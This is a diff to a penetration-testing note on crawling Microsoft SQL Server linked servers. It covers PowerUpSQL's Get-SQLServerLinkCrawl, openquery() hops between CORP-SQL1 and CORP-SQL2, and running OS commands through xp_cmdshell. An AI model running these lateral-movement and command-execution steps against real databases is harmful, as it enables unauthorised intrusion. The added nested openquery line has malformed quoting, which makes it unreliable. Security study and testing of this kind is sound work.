@@ -111,7 +111,9 @@ Get-SQLServerLinkCrawl -Instance mssql.corp.local -Verbose
 > `select * from master..sysservers`
 >
 > Openquery() function can be used to run quieries on a linked database:
-> `select * from openquery('sql2.corp.local', 'select * from master..sysservers')`
+> `select * from openquery("CORP-SQL1", 'select * from master..sysservers')`
+>
+> `select * from openquery("CORP-SQL1", ''select * from openquery("CORP-SQL2", 'master..sysservers'')')`
 
 To execute commands from MSSQL server we need to use `xp_cmdshell`. If `rpcout` is enabled `xp_cmdshell` can be enabled using:
 
@@ -124,4 +126,3 @@ And finally:
 ```powershell
 Get-SQLServerLinkCrawl -Instance mssql.corp.local -Query "exec master..xp_cmdshell 'whoami'"
 ```
-
